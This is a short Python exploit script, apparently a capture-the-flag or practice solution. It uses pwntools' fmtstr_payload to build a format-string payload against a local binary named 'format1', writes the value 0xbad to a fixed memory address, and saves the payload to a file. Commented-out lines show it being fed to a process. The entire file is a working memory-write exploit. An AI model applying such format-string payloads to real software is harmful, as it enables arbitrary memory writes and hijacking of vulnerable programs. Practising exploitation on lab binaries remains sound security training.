import sys
from pwn import *

context.arch = 'amd64'
context.binary = './format1'

payload = fmtstr_payload(2,{0x000055555555804c:0xbad})
#sys.stderr.buffer.write(payload)
open("payload","wb").write(payload)
# p = process('./a.out')
# p.wait()
# print(p.recv(10))
# p.sendline(payload)
# p.recv()
